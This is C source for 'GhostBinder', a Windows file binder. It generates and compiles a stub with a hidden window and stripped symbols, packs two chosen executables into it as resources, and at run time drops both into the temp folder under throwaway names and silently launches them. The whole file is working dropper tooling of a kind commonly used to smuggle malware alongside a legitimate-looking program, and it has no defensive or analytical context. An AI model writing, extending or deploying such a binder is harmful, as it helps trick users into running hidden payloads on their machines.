#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <io.h>



int CreateSection(const char *srcpath , const wchar_t *ResourceName , const wchar_t *exePath)
{
    FILE* src = fopen(srcpath, "rb");

    if (!src)
    {
        printf("Failed to open file\n");
        return 1;
    }

    LARGE_INTEGER filesize;

    int fd = _fileno(src);
    HANDLE srchandle = (HANDLE)_get_osfhandle(fd);

    GetFileSizeEx(srchandle, &filesize);
    unsigned char* buffer = malloc(filesize.QuadPart);
    if (!buffer)
    {
        printf("Failed to open buffer\n");
        fclose(src);
        return 1;
    }

    fread(buffer, 1, filesize.QuadPart, src);

    HANDLE h = BeginUpdateResourceW(
        exePath,
        FALSE
    );

    if (!h)
    {
        printf("Error: %lu\n", GetLastError());
    }

    BOOL ok = UpdateResourceW(
        h,
        RT_RCDATA,
        ResourceName,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        buffer,
        filesize.QuadPart
    );

    EndUpdateResourceW(h, FALSE);

    if (!ok)
    {
        printf("UpdateResource failed\n");
        return 1;
    }

    fclose(src);
    free(buffer);

    return 0;
}


int main(int argc, char* argv[])
{
    if (argc < 3) {
        printf("Usage: %s <file1.exe> <file2.exe>\n", argv[0]);
        return 1;
    }

    char* srcfile1 = argv[1];
    char* srcfile2 = argv[2];


    FILE *binderC = fopen("GhostBinder.c", "w");

    fprintf(binderC,
        "#include <Windows.h>\n"
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <io.h>\n\n"
        "void ExecuteResource(const wchar_t *moduleName, const wchar_t *exePath) {\n"
        "    HMODULE hModule = GetModuleHandleW(NULL);\n"
        "    HRSRC hRes = FindResourceW(hModule, moduleName, (LPCWSTR)RT_RCDATA);\n"
        "    if (!hRes) return;\n"
        "    DWORD size = SizeofResource(hModule, hRes);\n"
        "    HGLOBAL hData = LoadResource(hModule, hRes);\n"
        "    if (!hData) return;\n"
        "    void* pData = LockResource(hData);\n"
        "    FILE* src = _wfopen(exePath, L\"wb\");\n"
        "    if (src) {\n"
        "        fwrite(pData, 1, size, src);\n"
        "        fclose(src);\n"
        "        ShellExecuteW(NULL, L\"open\", exePath, NULL, NULL, SW_SHOW);\n"
        "    }\n"
        "}\n\n"
        "int main() {\n"
        "    char tempPath[MAX_PATH];\n"
        "    GetTempPathA(MAX_PATH, tempPath);\n"
        "    wchar_t fullPath1[MAX_PATH];\n"
        "    wchar_t fullPath2[MAX_PATH];\n"
        "    swprintf(fullPath1, MAX_PATH, L\"%%hsasdf1.exe\", tempPath);\n"
        "    swprintf(fullPath2, MAX_PATH, L\"%%hsasdf2.exe\", tempPath);\n"
        "    ExecuteResource(L\"SRC1\", fullPath1);\n"
        "    ExecuteResource(L\"SRC2\", fullPath2);\n"
        "    return 0;\n"
        "}\n"
    );

    fclose(binderC);

    printf("[*] Building GhostBinder.exe...\n");

    int result = system("gcc GhostBinder.c -o GhostBinder.exe -lshell32 -mwindows -s -static ");

    if (result != 0) 
    { 
        printf("[-] Error failed to build \n"); 
        return 1; 
    }

    printf("[+] Built Binder! \n");

    Sleep(3000);

    CreateSection(srcfile1, L"SRC1", L"GhostBinder.exe");
    CreateSection(srcfile2, L"SRC2", L"GhostBinder.exe");
    

    
}